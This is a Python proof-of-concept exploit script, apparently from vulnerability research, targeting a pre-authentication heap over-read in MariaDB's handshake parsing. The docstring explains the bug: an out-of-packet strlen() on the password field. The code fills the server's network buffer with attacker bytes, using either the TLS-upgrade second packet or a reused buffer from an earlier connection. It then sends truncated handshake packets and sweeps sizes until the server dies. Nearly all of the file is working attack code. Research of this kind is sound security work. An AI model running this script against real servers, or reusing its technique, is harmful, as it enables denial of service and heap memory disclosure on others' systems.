#!/usr/bin/env python3
"""
NOTES 4.3, pushed from "reachable" to "can the slack be attacker-filled?".

4.3 is an out-of-packet `strlen()`:

    if (!(thd->client_capabilities & CLIENT_SECURE_CONNECTION))
      passwd_len= strlen(passwd);          /* sql_acl.cc:14567 */

When the username runs to the final byte of the packet, `strend(user)` lands on
the terminator `my_net_read()` guarantees at read_pos[pkt_len], so `passwd`
points one byte *past* it and the scan walks the unused tail of net->buff. The
tail is `my_malloc`'d and never zeroed, and 4.3 called this untriggerable
because a fresh mapping reads back as zeros, so the scan stops at once.

That argument only holds if the attacker cannot put bytes in the tail. This
checks whether the TLS upgrade lets them: parse_client_handshake_packet() runs
once per connection, but its CLIENT_SSL branch reads a *second* packet into the
same net->buff --

    int ssl_ret = sslaccept(ssl_acceptor_fd, net->vio, net->read_timeout, &errptr);
    ...
    pkt_len= my_net_read(net);             /* sql_acl.cc:14490 */

-- so a large pre-TLS packet followed by a small post-TLS one leaves the first
packet's bytes sitting in the tail that the scan then walks. If the whole tail
is non-zero the scan runs off the end of the allocation, which is a real
heap-buffer-overflow read that ASAN reports on its own; no instrumentation of
mine is involved.

Usage: python3 -I poc_slack_scan.py [host] [port]
"""

import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mariadb_preauth import (  # noqa: E402
    Conn, server_alive, BASE_CAPS, CLIENT_SSL, CLIENT_PROTOCOL_41,
    CLIENT_SECURE_CONNECTION, CLIENT_CONNECT_WITH_DB, CLIENT_PLUGIN_AUTH,
    CLIENT_CONNECT_ATTRS, CLIENT_MYSQL,
)

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3307

FILL = 0xAA          # anything non-zero: the scan must not find a terminator


def one_case(pad, user_len, fill=FILL):
    """Returns (outcome, still_alive)."""
    c = Conn(HOST, PORT, timeout=20.0)
    g = c.read_greeting()
    if g is None:
        return "no greeting", True
    if not (g["capabilities"] & CLIENT_SSL):
        return "server has no CLIENT_SSL", True

    # --- packet 1: only the capability words are parsed before sslaccept(),
    #     so everything after them is free padding that lands in net->buff.
    caps1 = (CLIENT_SSL | CLIENT_PROTOCOL_41 | BASE_CAPS) & ~CLIENT_MYSQL
    pkt1 = c.build_handshake_response(
        caps=caps1, ext_caps=0, charset=45, user=b"x",
        reserved=bytes([fill]) * 19,
        raw_tail=bytes([fill]) * pad,
    )
    try:
        # pkt1 *is* the SSLRequest: sending it separately would leave
        # start_tls()'s own 32-byte request to be read as TLS bytes.
        c.start_tls(request=pkt1)
    except Exception as e:                                   # noqa: BLE001
        c.close()
        return f"tls failed: {type(e).__name__}", server_alive(HOST, PORT, 10.0)

    # --- packet 2: username runs to the last byte, with no NUL of its own, so
    #     passwd ends up one past the packet terminator. CLIENT_SECURE_CONNECTION
    #     is cleared to select the strlen() branch; no db, no plugin, no attrs.
    caps2 = (CLIENT_PROTOCOL_41 | BASE_CAPS) & ~(
        CLIENT_SECURE_CONNECTION | CLIENT_CONNECT_WITH_DB |
        CLIENT_PLUGIN_AUTH | CLIENT_CONNECT_ATTRS | CLIENT_MYSQL)
    pkt2 = c.build_handshake_response(
        caps=caps2, ext_caps=0, charset=45,
        user=b"u" * user_len,
        truncate=32 + user_len,          # cut before user's own NUL
    )
    try:
        c.send_packet(pkt2)
        reply = c.read_packet()
    except OSError as e:
        c.close()
        return f"closed: {e.__class__.__name__}", server_alive(HOST, PORT, 10.0)
    c.close()

    if reply and reply[0] == 0xff:
        code = reply[1] | (reply[2] << 8)
        return f"err{code}", True
    return f"reply {reply[:1].hex() if reply else 'none'}", True


def fill_then_scan(fill_len, rounds, fill=FILL):
    """The strongest form: one connection fills a buffer and drops it, the next
    connection's my_net_init() may be handed the same freed chunk, so the tail
    the scan walks is the previous connection's data rather than a fresh
    mapping. Run repeatedly because it depends on the allocator reusing it."""
    worst = 0
    for _ in range(rounds):
        # connection A: a maximal packet, to write over as much of net->buff
        # as possible without forcing net_realloc into a fresh allocation
        a = Conn(HOST, PORT, timeout=20.0)
        if a.read_greeting() is not None:
            caps = (CLIENT_PROTOCOL_41 | BASE_CAPS) & ~CLIENT_MYSQL
            pkt = a.build_handshake_response(
                caps=caps, charset=45, user=b"u",
                raw_tail=bytes([fill]) * fill_len)
            try:
                a.send_packet(pkt)
                a.read_packet()
            except OSError:
                pass
        a.close()
        # connection B: trigger the out-of-packet scan over that tail
        out, alive = one_case(0, 64)
        worst += 1
        if not alive:
            return f"server died after {worst} pairs", False
    return f"{rounds} fill/scan pairs", True


def main():
    if not server_alive(HOST, PORT, 15.0):
        print("server not reachable")
        return 2
    print(f"target {HOST}:{PORT}   fill=0x{FILL:02x}")
    print("pre-TLS padding sweep: how much of net->buff the attacker can "
          "pre-fill before the post-TLS packet shrinks it back\n")
    pads = [0, 512, 2048, 4096, 8192, 12288, 16000, 16352, 20480, 65536]
    users = [8, 64, 200, 380]
    dead = None
    for pad in pads:
        for ul in users:
            out, alive = one_case(pad, ul)
            print(f"  pad={pad:<6} user_len={ul:<4} -> {out:<28} alive={alive}")
            if not alive:
                dead = (pad, ul)
                break
        if dead:
            break
    print()
    print("fill-then-scan: previous connection's buffer as the tail")
    for fl in [4096, 16000, 16340, 16352, 16384]:
        out, alive = fill_then_scan(fl, 25)
        print(f"  fill_len={fl:<6} -> {out:<34} alive={alive}")
        if not alive:
            dead = (fl, "pair")
            break
    print()
    if dead:
        print(f"*** server died at pad={dead[0]} user_len={dead[1]} ***")
        return 1
    print(f"server alive at end: {server_alive(HOST, PORT, 20.0)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
